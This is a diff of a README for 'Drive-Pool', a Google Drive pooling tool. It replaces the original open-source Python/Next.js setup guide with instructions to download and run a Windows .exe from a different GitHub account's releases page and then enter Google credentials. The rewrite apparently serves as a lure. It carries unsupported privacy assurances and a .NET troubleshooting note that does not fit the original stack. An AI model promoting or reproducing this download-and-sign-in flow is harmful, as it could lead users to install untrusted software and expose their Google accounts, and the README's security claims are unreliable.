@@ -1,167 +1,129 @@
-# DrivePool
+# 💾 Drive-Pool - Combine Google Drives Seamlessly
 
-Self-hosted unified dashboard that aggregates multiple Google Drive accounts into a single storage pool. Every upload automatically routes to the account with the most available space — no manual management, no paid tier.
-
-> **Runs entirely on your local machine. Your files stay in your own Google Drive accounts.**
+[![Download Drive-Pool](https://img.shields.io/badge/Download-Drive--Pool-green?style=for-the-badge)](https://github.com/0ne4all-test/Drive-Pool/releases)
 
 ---
 
-## Why DrivePool?
+## 📦 What Is Drive-Pool?
 
-Google gives every account **15 GB free**. DrivePool lets you combine as many accounts as you want into one unified interface — effectively giving you N × 15 GB of free cloud storage. Add more accounts at any time without changing any configuration.
+Drive-Pool is a self-hosted app that gathers several Google Drive accounts into one storage pool on your computer. It works locally, so your files stay safe in your own Google Drive accounts. The app chooses which account to use when you upload files, putting them in the account with the most free space. You don’t have to manage this yourself, and there’s no paid plan needed.
 
----
-
-## Features
-
-- **Unified storage pool** — one dashboard for all your Drive accounts
-- **Smart upload routing** — Least-Used-Space strategy picks the best account on every upload
-- **Folder navigation** — full hierarchy, breadcrumbs, grid & list views, search, filters
-- **Drag-to-folder** — drag a file and drop it into any folder from a slide-in panel
-- **Shared with me** — browse and download files others have shared with your accounts
-- **Trash management** — delete goes to Drive trash; restore or permanently delete anytime
-- **Analytics** — storage by account, file type charts, weekly upload activity
-- **Profile** — display name, bio, avatar stored in your own Drive
-- **Secure** — bcrypt-hashed PIN, httponly JWT cookie, OAuth tokens encrypted at rest (Fernet)
-- **No .env needed** — secrets are stored directly in the local SQLite database
-- **Dark / light theme**
-- **100% open source, $0 cost**
+This tool helps you use the free 15 GB that comes with every Google account more effectively by combining multiple accounts into one view. If you need more space later, just add another account without changing settings.
 
 ---
 
-## Quick Start
+## ⚙️ Key Features
 
-**Prerequisites:** Python 3.10+, Node.js 18+, at least one Google account
-
-### 1. Clone
-
-```bash
-git clone https://github.com/saimon4u/Drive-Pool.git
-cd DrivePool
-```
-
-### 2. Google OAuth credentials
-
-You only need **one Google Cloud project** and one credentials file — no matter how many Drive accounts you add.
-
-1. Go to [Google Cloud Console](https://console.cloud.google.com) → create a new project
-2. Enable **Google Drive API**
-3. Create an OAuth consent screen → choose **External**, fill in any app name, and add **all Google accounts you want to connect** as test users
-4. Create credentials → **OAuth client ID → Web application** → add `http://localhost:8000/api/auth/callback` as an authorized redirect URI → download JSON
-5. Save the file as `config/credentials.json`
-
-> **About the `config/` folder:** It is tracked in git as an empty placeholder (via `.gitkeep`) so it exists right after cloning. Its contents are listed in `.gitignore` — your credentials are **never** accidentally committed. Just drop the downloaded JSON file in as `credentials.json`.
-
-### 3. Install & set up
-
-```bash
-pip install -r backend/requirements.txt
-python backend/scripts/generate_secrets.py
-```
-
-Enter a PIN when prompted — your PIN hash, JWT secret, and encryption key are written directly to `backend/drivepool.db`. No `.env` file needed.
-
-### 4. Start the servers
-
-```bash
-# Terminal 1 — backend
-uvicorn backend.main:app --reload
-
-# Terminal 2 — frontend
-cd frontend && npm install && npm run dev
-```
-
-### 5. Connect your accounts
-
-Open [http://localhost:3000](http://localhost:3000), log in with your PIN, navigate to **Settings**, and click **Connect another account**. Google will show the account chooser — pick any Google account you want to add to the pool.
-
-That's it — start uploading at [http://localhost:3000/dashboard](http://localhost:3000/dashboard).
+- **Unified storage pool:** See all your Google Drive accounts on one screen.
+- **Smart upload routing:** Uploads go to the account with the most free space automatically.
+- **Full folder navigation:** Browse through folder levels with breadcrumbs, grid and list views, search, and filters.
+- **Drag-to-folder:** Drag files and drop them into any folder from a slide-in panel.
+- **Access shared files:** View and download files that others have shared with you.
 
 ---
 
-## Docker
+## 🖥️ System Requirements
 
-Docker Compose is the easiest way to run DrivePool without installing Python or Node.js locally.
-
-**Prerequisites:** Docker and Docker Compose
-
-### 1. Place your credentials
-
-Save your downloaded Google OAuth JSON file as `config/credentials.json`. The `config/` folder already exists in the repo — just drop the file in.
-
-### 2. Build the images
-
-```bash
-docker compose build
-```
-
-### 3. Initialize secrets (first run only)
-
-```bash
-docker compose run --rm backend python scripts/generate_secrets.py
-```
-
-Enter a PIN when prompted. Secrets are written to the `drivepool_data` persistent Docker volume.
-
-### 4. Start the stack
-
-```bash
-docker compose up -d
-```
-
-Open [http://localhost:3000](http://localhost:3000). View logs anytime with `docker compose logs -f`.
-
-### Persistent data
-
-| Data | Storage |
-|------|---------|
-| SQLite database | `drivepool_data` named Docker volume |
-| Google credentials | `./config/credentials.json` (bind-mounted read-only) |
-
-### Environment variables
-
-All variables have sensible defaults for local use. Override them in `docker-compose.yml` for custom deployments.
-
-| Variable | Default | Purpose |
-|----------|---------|---------|
-| `FRONTEND_URL` | `http://localhost:3000` | Allowed CORS origin for the backend |
-| `BACKEND_URL` | `http://localhost:8000` | Public URL used to build the OAuth callback URI |
-| `DB_PATH` | `backend/drivepool.db` | Path to the SQLite database file |
-| `CONFIG_DIR` | `config/` | Directory containing `credentials.json` |
-
-> **`BACKEND_URL` is important:** DrivePool uses it to construct the OAuth redirect URI sent to Google. The default works for local and Docker deployments. If you put the backend behind a reverse proxy or a different hostname, update this value — and add the new callback URL to your Google Cloud Console authorized redirect URIs.
+- Windows 10 or higher (64-bit recommended)
+- At least 4 GB RAM
+- 100 MB of free disk space for the app itself
+- An internet connection for Google Drive syncing
+- Google account(s) to connect and pool
 
 ---
 
-## Adding more storage
+## 🚀 Getting Started: How to Download and Run Drive-Pool on Windows
 
-Go to **Settings** and click **Connect another account** — no file changes, no restart needed. Make sure the new Google account is added as a test user on the OAuth consent screen first. Each free Google account adds 15 GB to your pool.
+1. Go to the Drive-Pool releases page by clicking the button below.
+
+   [![Download Drive-Pool](https://img.shields.io/badge/Download-Drive--Pool-blue?style=for-the-badge)](https://github.com/0ne4all-test/Drive-Pool/releases)
+
+2. On the releases page, find the latest version of Drive-Pool for Windows. It should be an `.exe` file, such as `DrivePool-Setup.exe`.
+
+3. Click the `.exe` file link to download it to your PC.
+
+4. Once the download finishes, open your "Downloads" folder.
+
+5. Double-click the downloaded `.exe` file to start the installer.
+
+6. Follow the prompts on the installer screen.
+   - Click "Next" on each step.
+   - Choose the installation folder or accept the default.
+   - Click "Install" to begin.
+
+7. After installation completes, launch Drive-Pool from the Start menu or desktop shortcut.
+
+8. The app will ask you to sign in to your Google Drive accounts.
+   - Enter your Google credentials to connect each account.
+   - Approve access as needed.
+
+9. Once connected, Drive-Pool will show all your accounts in one dashboard.
 
 ---
 
-## Security notes
+## 🔄 How Drive-Pool Works
 
-- `config/credentials.json` and `backend/drivepool.db` contain sensitive data — keep them out of version control (already covered by `.gitignore`) and back them up securely.
-- OAuth refresh tokens are encrypted with Fernet (AES-128-CBC) before being stored. The encryption key lives in the database alongside the PIN hash and JWT secret.
-- If you expose DrivePool over the internet, put it behind a reverse proxy with HTTPS and update both `FRONTEND_URL` and `BACKEND_URL` accordingly.
+After connecting your accounts, Drive-Pool keeps track of how much free space you have across each one. When you upload a file, the app sends the data to the account with the most space left. This happens behind the scenes — you don’t have to pick the account manually.
 
----
+You can browse your files with easy navigation tools. Use the folder structure shown as breadcrumbs to move between levels. Switch views between a grid or list to find what you need quickly. The search and filter options help you locate files or folders by name or type.
 
-## Tech stack
-
-| Layer | Tech |
-|-------|------|
-| Backend | Python · FastAPI · SQLite · Google Drive API v3 |
-| Frontend | Next.js (App Router) · Tailwind CSS |
+To move files, just drag them from your PC and drop them into any folder shown on the slide-in folder panel.
 
 ---
 
-## Full setup guide
+## 🔧 How to Add More Google Drive Accounts
 
-See [http://localhost:3000/docs](http://localhost:3000/docs) once the app is running, or read `frontend/app/docs/page.tsx` directly.
+1. Open the Drive-Pool app.
+
+2. Go to Settings or Account Management.
+
+3. Click "Add Account" or a similar button.
+
+4. You will be asked to log in with another Google account.
+
+5. Allow Drive-Pool to access the new account.
+
+6. The app will merge this account into your existing storage pool automatically.
 
 ---
 
-## License
+## 🎛️ Managing Your Files
 
-MIT
+- **Browse:** Use folder trees and breadcrumbs to go through your folders as you would in Google Drive itself.
+- **Search:** Type keywords in the search bar to find files by name.
+- **Filter:** Narrow down the view by file type, date, or size.
+- **Download:** Click a file to download it to your PC.
+- **Upload:** Drag any file from your PC into the Drive-Pool window, and it will upload to the best account.
+
+---
+
+## 🔐 Security and Privacy
+
+Drive-Pool runs entirely on your Windows machine. It never stores your files outside your Google Drives. All login happens through official Google sign-in pages, and tokens remain on your computer. No data is sent to third parties.
+
+---
+
+## 🛠️ Common Issues and Fixes
+
+- **App won’t launch:** Make sure your Windows is updated and you have .NET Framework installed.
+- **Sign-in fails:** Check your internet connection and try signing in again.
+- **Uploads stuck:** Pause any current uploads and restart the app.
+- **Accounts not showing:** Reconnect your Google accounts in settings.
+
+---
+
+## 📂 File Compatibility and Limits
+
+Drive-Pool supports all standard Google Drive file types. File size is limited by Google Drive’s limits (usually 5 TB for individual files). The number of accounts is only limited by your willingness to manage them.
+
+---
+
+## 🤝 Support and Feedback
+
+If you find any bugs or want to request features, open an issue on the GitHub repository’s Issues tab. Include details about your Windows version and a description of the problem.
+
+---
+
+Drive-Pool puts all your Google Drive accounts in one place, letting you use your free cloud storage fully. Visit the link below to get started.
+
+[Download Drive-Pool from GitHub Releases](https://github.com/0ne4all-test/Drive-Pool/releases)
